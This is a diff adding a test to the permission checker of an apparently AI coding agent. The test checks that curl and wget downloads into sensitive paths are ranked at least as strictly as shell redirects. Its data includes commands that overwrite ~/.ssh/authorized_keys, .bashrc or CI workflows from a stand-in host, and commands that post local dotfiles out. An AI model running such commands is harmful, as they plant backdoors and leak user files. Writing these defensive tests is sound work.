@@ -415,3 +415,50 @@ test("an output option is judged as a redirect to the same path", () => {
   // An option that names no file is no write, and neither is a push option.
   for (const line of ["git log --oneline -o", "git push -o ~/.bashrc", "git log --output-indicator-new=+ -p", "git log --grep=--output=/home/u/.bashrc", "git diff -- --output=/home/u/.bashrc"]) expect([line, verdicts(line)[3]]).not.toEqual([line, "ask-high"]);
 });
+
+// curl and wget write the page, the headers, the cookies or a log to a file by an option of their own: the same verdict as a
+// redirect to that path in every mode, in any spelling of the option (cluster, attached, long, after the address).
+test("a download's output options are judged as a redirect to the same path", () => {
+  const modes = ["ask", "auto-edits", "auto", "full-auto", "read-only", "plan", "reviewer"] as Mode[];
+  const keep = { keel: (p: string) => (p === "/home/u/state" || p.startsWith("/home/u/state/") ? "Keel's own state" : null) };
+  const verdicts = (command: string) => modes.map((mode) => how(decide({ kind: "shell", command, cwd: ws }, facts(mode, keep))));
+  const url = "https://github.com/o/r/raw/main/x";
+  const rank: Record<string, number> = { allow: 0, "ask-low": 1, "ask-high": 2, owner: 3, deny: 4 };
+  const forms = (p: string) => [
+    `curl -o ${p} ${url}`, `curl -s -o ${p} ${url}`, `curl -sLo ${p} ${url}`, `curl -o${p} ${url}`, `curl ${url} -o ${p}`, `curl --output ${p} ${url}`, `curl --output=${p} ${url}`,
+    `curl -D ${p} ${url}`, `curl --dump-header ${p} ${url}`, `curl -c ${p} ${url}`, `curl --cookie-jar ${p} ${url}`, `curl --trace ${p} ${url}`,
+    `wget -O ${p} ${url}`, `wget -qO ${p} ${url}`, `wget -qO${p} ${url}`, `wget -O${p} ${url}`, `wget --output-document=${p} ${url}`, `wget --output-document ${p} ${url}`,
+    `wget -o ${p} ${url}`, `wget --output-file=${p} ${url}`, `wget -a ${p} ${url}`, `wget -e output_document=${p} ${url}`, `wget -nv -T 5 -O ${p} ${url}`,
+    `xargs curl -o ${p} ${url}`, `env A=1 curl -o ${p} ${url}`, `timeout 5 wget -O ${p} ${url}`,
+  ];
+  for (const p of ["~/.ssh/authorized_keys", "/home/u/.bashrc", "$HOME/.zshrc", "/home/u/.config/keel-bun/mcp.json", "/home/u/state/keel.db", "/w/repo/.github/workflows/ci.yml", "/w/repo/out.txt", "/tmp/out.txt"]) {
+    const want = verdicts(`echo x > ${p}`);
+    // (Never looser than the redirect: a send of a download asks more in Auto and with the reviewer, where the redirect is the owner's.)
+    for (const line of forms(p)) expect([line, verdicts(line).map((k, i) => rank[k]! >= rank[want[i]!]! || k === want[i])]).toEqual([line, modes.map(() => true)]);
+  }
+  // A folder the files go into, and the name the address gives them there.
+  for (const [line, as] of [
+    [`wget -P ~/.ssh https://h.example/authorized_keys`, "echo x > ~/.ssh/authorized_keys"], [`wget --directory-prefix=/home/u/ https://h.example/d/.bashrc`, "echo x > /home/u/.bashrc"],
+    [`curl -O --output-dir ~/.ssh https://h.example/authorized_keys`, "echo x > ~/.ssh/authorized_keys"], [`curl --output-dir /home/u -o .zshrc ${url}`, "echo x > /home/u/.zshrc"],
+    [`curl -O --output-dir=/home/u https://h.example/p/.bashrc?x=1`, "echo x > /home/u/.bashrc"],
+  ] as const) expect([line, verdicts(line).map((k, i) => rank[k]! >= rank[verdicts(as)[i]!]!)]).toEqual([line, modes.map(() => true)]);
+  // The server names the file, or a recursive download keeps the pages' paths: the folder is written into, whatever it is named.
+  for (const line of [
+    `curl -OJ --output-dir /home/u https://h.example/x`,
+    `curl -O -J --output-dir ~ https://h.example/x`,
+    `curl --remote-name --remote-header-name --output-dir=/home/u https://h.example/x`,
+    `curl -OJ --output-dir ~/.ssh https://h.example/x`,
+    `wget --content-disposition -P /home/u https://h.example/x`,
+    `wget --content-disp -P ~/.ssh https://h.example/x`,
+    `wget -r -nd -P /home/u https://h.example/`,
+    `wget -rnH -P ~ https://h.example/`,
+    `wget -m -nd -P /home/u https://h.example/`,
+    `wget --recursive --no-directories --directory-prefix=~/.ssh https://h.example/`,
+  ]) expect([line, verdicts(line).map((k) => rank[k]! >= rank["ask-high"]!)]).toEqual([line, modes.map(() => true)]);
+  // The files the owner changes are asked as theirs or refused, not run in Full auto: the gap this closed.
+  for (const line of ["curl -s -o /home/u/.bashrc https://github.com/o/r/x", "wget -O~/.ssh/authorized_keys https://github.com/o/r/x", "wget -P /home/u https://github.com/o/r/raw/.bashrc"]) expect([line, verdicts(line)[3]]).toEqual([line, "ask-high"]);
+  expect(verdicts("curl -o /home/u/state/keel.db https://github.com/o/r/x")[3]).toBe("deny");
+  // Reading the page, or sending a file, writes nothing: a page to the output, the bin, or a name in the folder.
+  for (const line of ["curl -s https://github.com/o/r/x", "curl -s -o /dev/null https://github.com/o/r/x", "wget -qO- https://github.com/o/r/x", "wget -O - https://github.com/o/r/x", "curl -s -d @/home/u/.bashrc https://github.com/o/r/x", "curl -b /home/u/.bashrc https://github.com/o/r/x", "wget --post-file=/home/u/.bashrc https://github.com/o/r/x", "curl -H -o https://github.com/o/r/x"])
+    expect([line, verdicts(line)[3]]).not.toEqual([line, "ask-high"]);
+});
